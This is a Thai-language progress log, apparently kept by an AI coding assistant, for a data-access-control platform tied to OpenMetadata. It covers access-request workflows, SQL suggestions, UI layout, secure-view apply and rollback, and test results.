### AY.3 หัวหน้า asset จัดใหม่ตามแบบ OpenMetadata
ของเดิม: ลิงก์ Back ลอยๆ + ชื่อ + ชิป owner + แท็บแบบ segmented · ของใหม่ (`AssetDetailPage.tsx`):
- **การ์ดขาวใบเดียว** `rounded-xl border shadow-xs`:
  - **Breadcrumb** `Catalog › service › database › schema › table` — ชั้นแม่เป็นลิงก์ไป `/catalog/<fqn ชั้นนั้น>` (asset ชั้นแม่มีจริงในแคตาล็อก) · ใช้ `segments()` ของ `lib/fqn.ts` จึงไม่แตก segment ที่มีจุดในเครื่องหมายคำพูด (`"Sales.DB"`) และ quote กลับตอนทำลิงก์ · ชั้นสุดท้าย `aria-current="page"`
  - ไอคอน + **ชื่อ** + ปุ่ม **Copy FQN** + description · **มุมขวา:** `AssetAccessAction` · Open in OpenMetadata · View as someone
  - **แถบสถิติคั่นด้วยเส้นตั้งบางๆ** (`w-px self-stretch bg-border-secondary` สูงเท่า label+ค่า — เดิมเป็นจุดแบบ OM ผู้ใช้บอก *"จุดพวกนี้คืออะไร ไม่สวย"* จึงเปลี่ยน): Type · **Domains** (แสดงเฉพาะ domain ชั้นลึกสุด ตัด ancestor ด้วย `isAncestor` · title = FQN เต็ม · เกินหนึ่ง = `+N`) · **Owners** (avatar ตัวอักษรแรก + ชื่อ · title บอก *named on this asset* / *inherited from …* · ไม่มี = **"No owner"** สีเตือน) · Tier (badge) · Certification · Source · Columns · ค่าว่าง = `--`
- **แท็บเป็นการ์ดแยก** แบบ OM: ขีดใต้สี brand ที่แท็บที่เปิดอยู่ · badge จำนวน column เป็นสีทึบเมื่อ active · `role="tablist"` เดิม
- sidebar: panel Owners ย้ายขึ้นไปอยู่ในแถบสถิติแล้ว · Location เพิ่ม **FQN**
- `BackLink` ยังใช้ในหน้า error
- ตรวจด้วยตาในเบราว์เซอร์จริง (playwright, 1440×900) ครบ: analyst_a บน `assignments` (ปุ่มน้ำเงิน → dialog) · `users` (กุญแจ → ชื่อ policy DENY) · `customers` (Access requested) · `demo-pg…customer` (Risk / Credit · No owner) · admin แท็บ Columns (badge 3 สีทึบ)

### AY.4 ทดสอบ flow ขอสิทธิ์ทั้งเส้น + seed เคส demo (บนระบบที่รันอยู่)
- **E2E smoke 30/30 ผ่าน** ผ่าน API จริง: eligibility (readable / requestable / blocked / open) · ขอ → ซ้ำโดนปฏิเสธ (มีคำขอเปิดอยู่แล้ว) · ผู้ขออนุมัติของตัวเองไม่ได้ · approve → grant ออกจริง → query อ่านได้ (PII ยัง mask) · reject ต้องมีเหตุผล · withdraw · DENY policy ขอไม่ได้ · audit ครบทุกขั้น
- **เคส demo ที่ค้างไว้ในระบบ:**
  - analyst_a → `dtp-iprm…assignments` = ปุ่ม Request access · `…users` = กุญแจ (DENY `deny-app-login-accounts`) · `…customers` = Access requested
  - admin → `/requests` มี **3 คำขอรอพิจารณา**
  - analyst_c → Query `demo-pg` `sales.customer` ได้แถว CNX-01 และ PII ถูก mask (grant จากคำขอที่อนุมัติ)
  - analyst_b มีคำขอที่ **ถูกปฏิเสธพร้อมเหตุผลภาษาไทย** · analyst_a มีคำขอที่ **ถอนเอง**
- ข้อควรรู้ตอน demo: owner ใน OM ยังไม่มี login ในเครื่องนี้ → **admin เป็นคนตัดสิน** · การอ่านขึ้นกับหน้าต่างเวลา 08:00–23:00 Asia/Bangkok ของ policy · รายการของ analyst_a มีแถวประวัติจาก smoke test ปนอยู่

### AY.5 เทสต์
- Backend: `./mvnw -o verify -Pintegration` → **BUILD SUCCESS** · unit **696** (dac-service **191** — +1 `SpaServletTest.unusualCharacters`) · integration **209** · Failures 0 Errors 0
- Frontend: **34 suites / 283 tests** เขียว (+10 `AriaRouter.test.tsx` · `AssetRequestAccess.test.tsx` 9 เคส — ปุ่ม/ฟอร์มซ่อนก่อนกด · dialog ส่ง body ถูก (`sourceId`/`attemptedSql`/`deniedBy` = null, reason trim) แล้วขึ้น Request sent · Cancel ไม่ส่ง · readable · Access requested → `/requests` · blocked ไม่มีฟอร์ม · ไม่ requestable = ว่าง · schema ไม่ fetch · error = ว่าง · `AssetDetailPage.test.tsx` +4 — breadcrumb ลิงก์ชั้นแม่ ไม่ลิงก์ตัวเอง · segment ที่มีจุดในเครื่องหมายคำพูดเป็นชั้นเดียว · แถบสถิติชื่อ domain ชั้นลึกสุด (ไม่ใช่ Finance) + owner + Tier1 · No owner) · `tsc --noEmit` exit 0 · `vite build` (`VITE_BASE=/Arak/`) ผ่าน

---

## รอบก่อนหน้า — **M13 เสร็จ + M9 slice 1: SQL Suggest ในหน้า Query · ติดสิทธิ์แล้วขอ Data Owner ได้ · หน้า `/requests` · UI จัดให้เข้า theme**

> โจทย์: *"หน้า Query ให้มี Suggest ด้วยสิ ถ้าติดสิทธิ ก็ให้ไปขอ Data Owner"* + *"ทำ UI ให้ออกมาตรง Theme และสวยๆ นะ ดู Open metadata ได้"*
> ผลคือคนที่พิมพ์ SQL เห็นก่อนกด Run ว่า table ไหนอ่านได้ table ไหนต้องขอ — และถ้าโดนปฏิเสธ หน้าเดียวกันส่งคำขอไปหา owner ได้ทันที โดย owner อนุมัติ/ปฏิเสธจากหน้า `/requests`
> ⚠️ **พฤติกรรม approve ของรอบนี้ (approve = ออก grant ทันที) กำลังจะถูกเปลี่ยนตามที่ผู้ใช้สั่ง — ดูข้อ AX.9**

### AX.1 Schema — `V21__access_request.sql`

| ตาราง | สาระ |
|---|---|
| `access_request` | `asset_fqn` · `requester_id` (FK principal, `ON DELETE SET NULL`) + `requester_username` (เก็บชื่อไว้ให้ audit อ่านออกแม้ principal ถูกลบ) · `data_source_id` · `reason` (**ห้ามว่าง** — check constraint) · `purpose` · `requested_days` (1–365 หรือ null = until revoked) · `attempted_sql` · `denied_by` (ข้อความ refusal ตอนที่ติด) · `status` PENDING / APPROVED / REJECTED / WITHDRAWN · `decided_by` / `decided_at` / `decision_note` · `grant_id` (FK `access_grant`) |
| constraint | `access_request_decided` — ถ้าไม่ใช่ PENDING ต้องมี decided_at · `access_request_approved_has_grant` — `(status='APPROVED') = (grant_id IS NOT NULL)` ← **slice 2 ต้องคลายตัวนี้** |
| unique index | PENDING ได้แค่ **1 คำขอต่อ (asset, requester)** — กดซ้ำได้ 409 |
| `access_grant` | เพิ่ม FK `request_id → access_request` + check `(source='request') = (request_id IS NOT NULL)` — grant ที่มาจากคำขอย้อนกลับไปหาคำขอได้เสมอ (ตามที่ออกแบบ `source`/`request_id` ไว้ตั้งแต่ Phase 1 ใน FR-7) |
| `audit_access_request` | append-only ทุกการเปลี่ยนสถานะ |

### AX.2 `AccessEligibility` — ตอบได้ 3 แบบ ไม่ใช่ 2

ก่อนจะชวนใครไปขอสิทธิ์ ต้องรู้ก่อนว่า **grant ช่วยได้จริงไหม** — ไม่งั้น owner จะอนุมัติแล้วคนขอก็ยังโดนปฏิเสธเหมือนเดิม
1. **readable** — อ่านได้อยู่แล้ว
2. **requestable** — ที่ติดอยู่คือ "ไม่มี policy ไหน allow" / ไม่มี grant → grant แก้ได้ → คืน `approvers[]` (owner ของ table จาก OM ตรงหรือตกทอด, team ด้วย) และ `openRequestId` ถ้ามีคำขอค้างอยู่แล้ว
3. **neither** — ติด **DENY** หรือชั้นบนปฏิเสธ (time window, IP, purpose ฯลฯ) ซึ่ง grant ไม่มีทาง override (FR-3.3 / FR-5.1) → คืน `blockedBy` = ชื่อ policy ที่ขวาง **ไม่ส่งไปหา owner** ให้คนขอไปคุยกับเจ้าของ policy แทน

approver = owners ของ asset ใน OM · ถ้า asset ไม่มี owner เลย → platform admin (จะได้ไม่มีคำขอที่ไม่มีใครตัดสินได้)

### AX.3 REST — `AccessRequestResource` (`/api/v1/access-requests`)

| method | path | หมายเหตุ |
|---|---|---|
| POST | `/` | `{assetFqn, sourceId, reason, purpose, days, attemptedSql, deniedBy}` · reason ว่าง → 400 · days นอก 1–365 → 400 · ซ้ำ → 409 · อ่านได้อยู่แล้ว / ติด DENY → 409 พร้อมเหตุผล |
| GET | `/mine` | คำขอของฉัน |
| GET | `/inbox?status=` | คำขอที่ฉันตัดสินได้ (default PENDING) · แต่ละตัวมี `mayDecide` จาก server |
| POST | `/check` | `{assetFqns[], purpose}` → `{fqn: boolean}` **ของผู้เรียกเท่านั้น** (ไม่รับ username — ห้ามใช้ถามสิทธิ์คนอื่น) · จำกัดจำนวนต่อครั้ง (`MAX_CHECK`) · body ว่าง → 400 |
| GET | `/eligibility/{fqn}` | verdict เต็มตาม AX.2 |
| GET | `/{id}` | id ผิดรูป → 404 ไม่ใช่ 500 · route `/mine` `/inbox` ไม่ถูก `/{id}` กลืน |
| POST | `/{id}/approve` | `{days, note}` · **days = null → เท่าที่ขอ** (ไม่ใช่ until revoked) · **ลดได้ ขยายไม่ได้** (ขอ 7 อนุมัติ 30 → 400) · 0 → 400 · คำขอ until revoked อนุมัติแบบมีกำหนดได้ · คนขออนุมัติของตัวเองไม่ได้ (403 — separation of duty FR-2.6) · ซ้ำ → 409 · **ตอนนี้ออก grant `source=request` ทันที** |
| POST | `/{id}/reject` | `{note}` **ต้องมี note** ให้คนขอรู้ว่าทำไม |
| POST | `/{id}/withdraw` | เจ้าของคำขอเท่านั้น (คนอื่น 403/404) · เฉพาะ PENDING |

ทุก endpoint ใช้ `request.getRemoteAddr()` เป็น context IP (ไม่เชื่อ X-Forwarded-For — กติกาเดียวกับ QueryResource)
refusal 403 ของ `POST /v1/query` ตอนนี้พก `assetFqn` · `requestable` · `blockedBy` · `approvers[]` · `openRequestId` มาด้วย (`QueryResource` / `QueryService` / `DecisionService` / `QueryRewriter` ส่ง FQN ของ table ที่ติดขึ้นมา)
grant ที่ออกจากคำขอเป็น grant ธรรมดาทุกอย่าง — **compose กับทุก policy ตามปกติ: ไม่ override DENY ไม่ปลด mask ไม่ปลด row filter** (หน้า `/requests` เขียนประโยคนี้ไว้ให้ owner อ่านก่อนกด)

### AX.4 SQL Suggest ในหน้า Query (`sqlCompletion.ts` + `SqlEditor.tsx`)

- `sqlCompletion.ts` เป็น **pure function** — รู้ตำแหน่ง cursor ว่าอยู่หลัง `FROM`/`JOIN` (เสนอ table) · หลัง `alias.` (เสนอ column ของ table นั้น) · หลัง `SELECT`/`WHERE`/… (เสนอ column ของ table ใน FROM + keyword) · ไม่เสนออะไรใน string literal / comment
- rule-based ล้วน **ไม่ส่งอะไรให้ LLM** (M16 เป็นอีกงาน)
- ป้ายต่อ table: **Readable** (เขียว) / **Request needed** (เหลือง) — มาจาก `POST /access-requests/check` ครั้งเดียวต่อ source (cache ใน TanStack Query) ไม่ยิงทุกครั้งที่พิมพ์
- คีย์: ↑ ↓ เลื่อน · Enter/Tab ใส่ · Esc ปิด · มี footer บอกคีย์ใต้ list (aria-hidden เพราะ listbox ประกาศเองอยู่แล้ว)
- list เป็น portal `position: fixed` + พลิกขึ้นด้านบนเมื่อชิดขอบล่าง (ไม่โดน `overflow: hidden` ของ card ตัด)
- `role=combobox` / `listbox` / `aria-activedescendant` ครบ

### AX.5 ขอสิทธิ์จากจุดที่โดนปฏิเสธ (`RequestAccess.tsx`)

- refusal ที่ `requestable=true` → กล่อง **"The owner can let you in"** + ชื่อ approver + ปุ่ม Request access → ฟอร์ม เหตุผล (บังคับ) · จำนวนวัน (7 / 30 / 90 / until revoked หรือพิมพ์เอง 1–365) · purpose · แนบ SQL ที่ติดให้อัตโนมัติ
- มีคำขอค้างอยู่แล้ว → บอกว่า "ส่งไปแล้ว รอ owner" + ลิงก์ไป `/requests` แทนที่จะให้ส่งซ้ำ
- `requestable=false` → บอกชื่อ policy ที่ขวางและบอกตรงๆ ว่า **grant ช่วยไม่ได้** (ไม่มีปุ่มขอ)

### AX.6 หน้า `/requests` (`pages/requests/AccessRequestsPage.tsx`) + เมนู

- 2 section: **Waiting for you** (inbox — filter สถานะได้) · **Your requests**
- card ต่อคำขอ: table (ลิงก์ไป catalog) · สถานะ · purpose · เวลา · เหตุผล · ใครขอ (ฝั่ง owner) · กี่วัน · ใครตัดสิน (ฝั่งคนขอขณะ pending) · ใครตัดสิน+เมื่อไหร่+note · "What was refused" (SQL + ข้อความ refusal เดิม)
- ฝั่ง owner: ช่อง Grant days (ตรวจช่วงสดๆ: *"Between 1 and N days — no longer than was asked."*) · note · Reject (ต้องมี note) · Approve
- ฝั่งคนขอ: Withdraw เฉพาะ PENDING
- server เป็นคนบอก `mayDecide` — UI ไม่เดาเองว่าใครตัดสินได้
- เมนู `navigation.ts` + route ใน `App.tsx`

### AX.7 UI จัดให้เข้า theme (ตามแบบ OpenMetadata / EnforcementPage ที่มีอยู่)

pattern ที่ใช้ซ้ำ — **รอบถัดไปใช้ชุดเดียวกันนี้**
| ชิ้น | class |
|---|---|
| card | `rounded-xl border-secondary bg-primary shadow-xs` |
| icon tile | `size-10 rounded-lg bg-utility-brand-50` + icon `size-5 text-fg-brand-primary` |
| info note | `bg-utility-blue-50` + InfoCircle |
| error | `bg-utility-error-50 text-error-primary` + AlertTriangle, `role=alert` |
| empty state | กล่อง dashed `rounded-xl` + icon `size-7 text-fg-quaternary` |
| count pill | `bg-brand-primary text-brand-secondary` |
| footer ของ card (action) | `border-t bg-secondary px-5 py-4` |
| suggestion row | icon tile `size-6` ต่อชนิด: table = brand · column = blue (`utility-blue-600`) · keyword = gray |

### AX.8 ทดสอบ

| ชุด | ผล |
|---|---|
| backend unit | **695** เขียวทั้ง 10 module (dac-service 186 → 190) (+4 `AccessEligibilityTest` — `blockedBy` ต้องบอกชื่อ DENY ที่ match แม้อยู่ท้ายสุด · ไม่งั้นบอกชั้นที่ grant ผ่านไม่ได้ · ไม่งั้นบอกบรรทัด composition · ชื่อ policy ที่ไม่มีคำอธิบาย) |
| backend integration | **209** (dac-service 198 + `SecureViewApplierIT` 11) — `-Pintegration verify` เต็ม reactor 2026-09-25 00:5x → BUILD SUCCESS · Failures 0 Errors 0 (+23 `AccessRequestIT` บน Postgres จริง — เปิดคำขอ / เปิดซ้ำไม่ได้ / เปิดใหม่ได้หลังปิด / validation · approve เขียน grant / revoke ย้อนได้ / คนขออนุมัติเองไม่ได้ / คนนอกไม่เห็น / inbox / asset ไม่มี owner → admin / ลดวันได้ขยายไม่ได้ / ใส่กำหนดให้คำขอ until revoked ได้ / ตัดสินได้ครั้งเดียว / reject ต้องมี note / withdraw · eligibility: ไม่มี policy → requestable / อ่านได้แล้ว / **ชั้นที่ปฏิเสธ (time window) = ไม่ requestable** / ชั้นที่เปิด override ได้ / **DENY = ไม่ requestable** / **DENY ที่มาหลังขอไปแล้วยังชนะ** / **อนุมัติแล้ว mask ยังอยู่ (approval ≠ unmask)** / principal ที่ไม่รู้จัก) |
| frontend | **32 suites / 260 tests** (+20 `SqlEditor.test.tsx` · +16 `RequestAccess.test.tsx` · +13 `AccessRequestsPage.test.tsx` · +5 `accessRequests.test.ts` · `sqlCompletion.test.ts`) · `tsc --noEmit` exit 0 · `vite build` OK |
| live smoke บน jar จริง | **30/30** (`scratchpad/req_smoke.py`, ไม่ commit) — routing · `/check` ครบ 32 table · target `demo-pg.salesdb.sales.customer` ติด time window ของ `finance-subscription` → requestable · validation · สร้าง / ซ้ำ 409 · คนขออนุมัติเอง 403 · อนุมัติ 30 วัน (ขอ 7) → 400 · 0 → 400 · null → 7 วัน · ซ้ำ 409 · query รันได้ · `/check` = true · grant `source=request` · revoke → โดนปฏิเสธอีก · reject ไม่มี note 400 · withdraw ของคนอื่นไม่ได้ · **ล้างหลังจบ grant ถูก revoke หมด** |

### AX.9 ⚠️ ผู้ใช้สั่งเปลี่ยนต่อทันที (2026-09-25) — M9 slice 2

> *"อันนี้พอ Approve แล้ว ต้องให้ Data Owner, Steward หรือ Custodian มาทำให้ในระบบเนาะ ยังไม่ Auto แต่มี หน้า Impact Analysis และ ประเมิน Risk และ Suggestion ให้ Owner พิจารณาตอน Approve หรือ Reject และต้องมี Information ของคนที่ขอให้ชัดเจน Attribute, group, … หลังจาก Approve แล้ว มี Suggestion Policy ที่อาจจะ Conflict หรือ Suggestion ว่าต้องไปเพิ่มที่ Policy ไหน สร้างใหม่ หรืออย่างไร"*
> + *"Inbox ของ Access Request ควรมีปุ่มจากด้านบนไหม และควรมี notification จาก icon ด้านบนด้วยไหม"* → ตอบว่าควร

ผู้ใช้เลือก (AskUserQuestion):
1. **Approve = ตัดสินใจเท่านั้น แล้วค่อย Fulfil** — Approve บันทึกการตัดสินใจ สถานะเป็น APPROVED (รอ fulfil) · Owner / Steward / Custodian เลือกวิธี fulfil จาก suggestion: (ก) ออก grant ที่กรอกไว้ให้แล้ว (ข) เพิ่มคน/กลุ่มเข้า policy ที่มีอยู่ (ค) สร้าง policy ใหม่เป็น **Draft** เข้า lifecycle ปกติ · โชว์ conflict ก่อนลงมือ · ปิดคำขอ (FULFILLED) เมื่อทำเสร็จจริงเท่านั้น
2. **Steward / Custodian = Custom Property ใน OM** — custom property ชนิด user/team บน table (default ชื่อ `dataSteward` / `dataCustodian`) · sync read-only · ตกทอดจาก schema/database แบบ facet อื่น · ชื่อ property ตั้งได้ใน Settings

แผนที่จะทำ: V22 (สถานะ FULFILLED, `approved_days`, `fulfilled_by/at`, `fulfilment_kind` GRANT / POLICY_UPDATED / POLICY_CREATED, `fulfilment_ref`, คลาย `access_request_approved_has_grant`) · `GET /{id}/review` (ข้อมูลผู้ขอ: attribute / group / team / role / grant ที่มี / คำขอที่ผ่านมา · ข้อมูล asset: tag / tier / domain / owner / steward / custodian · impact: ถ้าได้สิทธิ์จะเห็นอะไร column ไหนถูก mask แถวไหนถูกกรอง · risk แบบ rule-based อธิบายได้ · suggestion · conflict) · `POST /{id}/fulfil` · หน้า review · ไอคอน Inbox + badge บน header
**suggestion ห้าม activate policy เอง** (กติกาเดียวกับ FR-2.6 / LLM) — สร้างได้แค่ Draft

### AX.10 กับดักที่เจอรอบนี้

- **`vite build` จาก Git Bash ต้องกัน path mangling** — `VITE_BASE=/Arak/` ถูก MSYS แปลงเป็น `/Program Files/Git/Arak/` เงียบๆ → jar เสิร์ฟหน้าขาว · ใช้ `MSYS_NO_PATHCONV=1 MSYS2_ARG_CONV_EXCL='*' VITE_BASE=/Arak/ npm run build` · และ `npm run build` เปล่าๆ จะเขียนทับ dist ด้วย base `/` (backend log เตือน blank page)
- local API ไม่มี prefix `/Arak` — `http://localhost:8080/api/v1` (prefix มีเฉพาะหลัง nginx บน prod) · UI local อยู่ที่ `http://localhost:8080/Arak/`
- catalog list คืน key `items` ไม่ใช่ `data` · `POST /query` ต้องการ `sourceId` (map จากชื่อ `dataSource` ผ่าน `GET /sources`)
- approve `days: null` ได้ 200 **ไม่ใช่ bug** — null = เท่าที่ขอ
- Prettier ไม่ใช่ gate (ไม่มี config และไฟล์เดิมก็ไม่ผ่าน)
- **FK ใหม่ทำ fixture ของ IT เก่าพัง** — V21 เพิ่ม `access_request.grant_id → access_grant` ทำให้ `TRUNCATE ... access_grant ...` ที่ไม่มี `CASCADE` ล้มทั้ง class (`PolicyOverviewIT` 24 · `PolicyBindingMaterializerIT` 10 — รอบแรกของ verify ได้ **34 errors**) · แก้โดยใส่ `access_request` เข้า TRUNCATE ของสองไฟล์นั้น · **ทุกครั้งที่เพิ่ม FK ชี้เข้าตารางเดิม ให้ `grep -rn TRUNCATE --include=*IT.java` หา fixture ที่ต้องตามแก้**

---

## รอบก่อนหน้า — **M5 slice 3 (ครึ่งหลัง): dry-run / apply / rollback ของ secure view ใช้ได้จากหน้าจอแล้ว** + เมนู Enforcement กลับมา

> โจทย์: *"งั้นทำต่อครับ"* — งานที่ค้างจากข้อ AU.7: `enforcement_state` store + REST dry-run / apply / rollback + หน้าจอ + เอาแท็บ Enforcement กลับมา
> ผลคือ chain 5.1.2 ต่อครบเป็นครั้งแรก: **กด Dry run บนหน้าจอ → อ่าน DDL → กด Apply → view ขึ้นที่ source จริง → คนสองคน select แล้วได้คำตอบคนละชุด → กด Roll back → view หายไป**

### AW.1 chain เต็มตอนนี้

```
EnforcementPage (UI)
  → EnforcementResource        /api/v1/enforcement/secure-views/*
    → SecureViewService         ประกอบ input ทั้งหมดจากที่เดียวกัน
      ├─ PolicyEngine           ตัดสินใจให้ "ทุกคน" (population) ไม่ใช่คนเดียว
      ├─ AppDbEntitlementSource แถว row_entitlement ของ app DB (commit ebc399f)
      ├─ SourceProbe            column list สด จาก source (ไม่ใช่จาก catalogue)
      ├─ ViewCompiler           view หน้าตายังไง            (slice 1)
      ├─ RowEntitlementMaintainer ใครได้แถวไหน              (slice 2)
      ├─ SecureViewApplier      ตัวเดียวที่เขียนลง DB ลูกค้า (slice 3 ครึ่งแรก)
      ├─ ReviewedPlans          dry run ที่มีคนอ่านแล้ว — ถือไว้ในหน่วยความจำ
      └─ EnforcementStateStore  enforcement_state + audit_enforcement (V20)
```

### AW.2 `V20__enforcement_audit.sql`

| อะไร | ทำไม |
|---|---|
| `enforcement_state` + `secure_object_schema` / `secure_object_name` | **rollback ต้อง drop object ที่สร้างไปจริง ไม่ใช่ชื่อที่ naming setting ของ source จะสร้างวันนี้** — ถ้ามีคนเปลี่ยน secure schema จาก `sec` เป็น `secure` หลัง apply แล้วกด rollback จะ drop view ที่ไม่เคยมี แล้ว **รายงานว่าสำเร็จ ทั้งที่ view จริงยังตั้งอยู่** |
| ตารางใหม่ `audit_enforcement` (append-only เหมือน V5) | ทุก dry run / apply / rollback **ไม่ว่าผลจะออกมายังไง** · outcome ∈ `REVIEWED` `APPLIED` `ROLLED_BACK` `STALE` `FAILED` `REFUSED` · เก็บ `review_id` + `signature` เพื่อตอบได้ว่า *"คนที่กด apply อ่านอะไรไป"* · `client_ip` มาจาก `getRemoteAddr()` |
| **dry run ก็ถูก audit** | มันไม่เขียนอะไร แต่มันเปิด connection เข้า DB ลูกค้าด้วย credential ของแพลตฟอร์มและอ่านว่าใครถืออะไรอยู่ — auditor ถามเรื่องนี้แน่ |

### AW.3 `EnforcementStateStore`

- `find` / `list` / `history(fqn, limit)` / `recordApplied` / `recordFailure` / `recordRolledBack` / `audit`
- ⚠️ **`recordFailure` ไม่ทับ `APPLIED` เป็น `FAILED`** — apply ครั้งที่สองที่พังถูก rollback ทั้ง transaction แปลว่า source ยังถือ view ตัวเดิมอยู่เป๊ะ · ถ้าเขียนว่า `FAILED` คนจะไปซ่อม object ที่ไม่ได้เสีย → สถานะคงเป็น `APPLIED` แล้ววาง `last_error` ไว้ข้างๆ · `FAILED` เกิดได้เฉพาะตอนที่ก่อนหน้านี้ยังไม่มีอะไรติดตั้ง
- `recordRolledBack` → `NOT_ENFORCED` + ล้างชื่อ object · **เก็บ script เดิมไว้** (สิ่งที่ apply ล่าสุดยังอ่านได้หลังถอดออกไปแล้ว)

### AW.4 `ReviewedPlans` — dry run ที่มีคนอ่านแล้ว

**apply ส่งมาแค่ `reviewId` ไม่มีอย่างอื่นเลย** — server เก็บสิ่งที่ตัวเองแสดงไว้เอง หน้าจอส่งแผนที่แก้เองกลับมาไม่ได้ และ**ไม่ควรจะทำได้**

| กติกา | ค่า |
|---|---|
| ใช้ได้ครั้งเดียว | `take()` คือเอาออกเลย — apply ครั้งที่สองด้วย id เดิม → 409 audit เป็น `STALE` |
| อายุ | 30 นาที |
| ความจุ | 256 — เกินแล้วลืมตัวที่เก่าสุดก่อน |
| ผูกกับ asset | id ของ asset อื่น → ไม่เจอ **และไม่ถูกเผาทิ้ง** (เจ้าของจริงยังใช้ได้) |

⚠️ **อยู่ในหน่วยความจำ = สมมติว่ามี PM2 process เดียว** (ซึ่งตรงกับ deploy ปัจจุบัน) · restart แล้ว review ทุกใบหาย → คนแค่กด Dry run ใหม่ ไม่มีอะไรพัง · **ถ้าวันหนึ่งรัน cluster mode หลาย instance ต้องย้ายลงตาราง** ไม่งั้น apply จะสุ่ม 404/409

### AW.5 `SecureViewService` — กติกาที่สำคัญ (อยู่ใน javadoc ของคลาสด้วย)

| กติกา | ทำไม |
|---|---|
| **column มาจาก source สด ไม่ใช่ catalogue** | column ที่ crawl ยังไม่เห็น = column ที่ไม่มี policy คุ้ม · ใช้ list สดสร้าง view แล้ว **column ที่ catalogue ไม่รู้จักขึ้นเป็น warning ที่คน review ต้องอ่าน** |
| **ตัดสินใจให้ทั้ง population** | maintainer revoke ทุกคนที่ไม่อยู่ใน input · population ที่โหลดไม่ครบ = revoke คนที่เกิน cut-off โดยไม่มีใครสั่ง → **เกิน `POPULATION_LIMIT` = 2000 ปฏิเสธ ไม่ตัด** · population ว่าง ก็ปฏิเสธ (ไม่งั้นคือ revoke ทุกคน) |
| **apply compile แผนใหม่แล้วเทียบ** | applier เทียบ `signature` ของแถว · คลาสนี้เทียบ **DDL** · สองอย่างขยับแยกกันได้ (เพิ่ม column ที่ source → DDL เปลี่ยน แถวไม่เปลี่ยน) → ไม่ตรง = 409 ไม่ apply อะไรเลย |
| **rollback ใช้ชื่อที่เก็บไว้ตอน apply** | ดู AW.2 |
| **credential ผ่าน `CredentialResolver` ตัวที่ `DacApplication` ถือ** | ตัวใหม่ไม่มี Fernet opener → อ่าน credential ที่ seal ไว้ไม่ออก · wire แล้วใน `DacApplication.java` |
| **ไม่ทำ cutover (FR-6.1.1)** | ไม่ GRANT SELECT บน view และไม่ REVOKE base table · view ที่ apply แล้ว**อ่านได้แค่เจ้าของ** จนกว่าจะมีคน grant = fail-closed · **dry run พูดเรื่องนี้ออกมาตรงๆ** ใน banner ของหน้าจอด้วย |
| `readerRole` = `null` | ยังไม่มี `DbPrincipalProvisioner` · view ใช้ `DB_PRINCIPAL` (current_user) |
| rollback | `DROP VIEW IF EXISTS` อย่างเดียว · **ไม่แตะ schema `acl`** (secure view ทุกตัวใน DB อ่านตาราง 3 ใบเดียวกัน และแถวพวกนั้นลำพังไม่ grant อะไร) |

### AW.6 `EnforcementResource` — `/api/v1/enforcement/secure-views`

| endpoint | ใคร | หมายเหตุ |
|---|---|---|
| `GET ?q=` | ADMIN · POLICY_AUTHOR · DATA_OWNER | candidate = table ที่ catalogue วางได้ บน source ที่เปิดอยู่ + สถานะ |
| `GET /state?fqn=&limit=` | เหมือนบน | state + ประวัติ audit |
| `POST /dry-run {assetFqn}` | เหมือนบน | คืน `reviewId` + `expiresAt` + DDL + rollback script + diff แถว + warning |
| `POST /apply {assetFqn, reviewId}` | **PLATFORM_ADMIN เท่านั้น** (method-level `@Secured`) | reviewId ไม่ใช่ UUID → 400 |
| `POST /rollback {assetFqn}` | **PLATFORM_ADMIN เท่านั้น** | ไม่มีอะไรติดตั้ง → 409 audit `REFUSED` |

error mapping: `NotFound` → **404** · `Conflict` (review หาย/stale) → **409** · `Refused` (ทำไม่ได้ตามที่ขอ ไม่ได้แตะอะไร) → **422** · `SourceFailure` (source ปฏิเสธ transaction ถูก rollback) → **502** · body เป็น `{"message": …}` ทุกตัว

### AW.7 หน้าจอ `/enforcement` + เมนูกลับมาแล้ว

- `frontend/app/src/pages/enforcement/EnforcementPage.tsx` (ใหม่) + `api/secureViews.ts` (ใหม่) · route ใน `App.tsx` · `navigation.ts`: เอา `hidden: true` ออก · `milestone: null` · description ใหม่ *"Review, apply and roll back secure views on registered sources."* · `visibleTo` เดิม (`POLICY_AUTHOR`, `DATA_OWNER` + admin)
- **Access ยังซ่อนอยู่** (รอหน้า overview ของ M8 — ดูข้อ AQ.9)
- การ์ดต่อ table: สถานะ · source · FQN · base table / secure view (หรือ *Would create*) / last change · last error · ปุ่ม **History** · **Dry run** · **Roll back** (admin + APPLIED/DRIFTED เท่านั้น — ต้องกดยืนยัน *"Drop the view"* อีกครั้ง)
- Review: *"Dry run — nothing has been written"* + เวลาหมดอายุ · 4 ตัวเลข (People decided / Allowed to read / Rows to write / Rows to remove) · warning สีเหลือง · live column (ตัวที่ไม่อยู่ใน catalogue เป็นสี warning) · script *Will run* / *Rollback, if needed* · **คนที่ไม่ใช่ admin เห็น review ได้แต่ไม่มีปุ่ม Apply** (*"Only a platform administrator can apply a review."*)
- apply ที่ถูกปฏิเสธ → **ล้าง review ทิ้งทันที** (มันถูกใช้ไปแล้ว กดซ้ำก็ 409) แล้วแสดงเหตุผลจาก server
- หน้าตาเป็นชุดเดียวกับหน้าอื่น (Button / Chip / TextField ตัวเดิม · ไม่มี style ใหม่) — ตรวจด้วย screenshot ผ่าน `:8090/Arak/` แล้ว · ช่องค้นหาเคยแคบเกิน → `tw:w-full`

### AW.8 เทสต์ที่เพิ่ม

| ไฟล์ | จำนวน | คุมอะไร |
|---|---|---|
| `ReviewedPlansTest` | 6 | ใช้ครั้งเดียว · asset อื่นไม่เผา review · หมดอายุตรงนาทีที่ 30 · นาทีที่ 29 ยังใช้ได้ · id ไม่รู้จัก/null · เกินความจุลืมตัวเก่าสุด |
| `SecureViewServiceIT` (Testcontainers) | 15 | candidate · dry run ไม่เขียนอะไร + บอก column ที่ไม่อยู่ใน catalogue · apply แล้วคนอ่านเห็นตาม policy · review ใช้ครั้งเดียว (ครั้งที่สอง = STALE) · id ปลอม · **column ที่เพิ่มหลัง review ทำให้ stale** · **policy ที่เปลี่ยนหลัง review ทำให้ stale** · **login อ่านอย่างเดียว → FAILED** · rollback drop view เท่านั้น · **rollback ใช้ชื่อที่เก็บไว้ ไม่ใช่ pattern วันนี้** · table ไม่รู้จัก = 404 + audit · source ปิดอยู่ · **population ว่างถูกปฏิเสธ** · table ที่ถูก drop หลัง crawl · credential resolve ไม่ได้ |
| `EnforcementPage.test.tsx` | 7 | แสดงสถานะ · dry run → apply ส่งแค่ fqn + reviewId · non-admin ไม่มี Apply / Roll back · apply ถูกปฏิเสธล้าง review · rollback ต้องยืนยัน Cancel ไม่ส่งอะไร · ไม่มีอะไรติดตั้งไม่มี Roll back · search ส่งไป server |

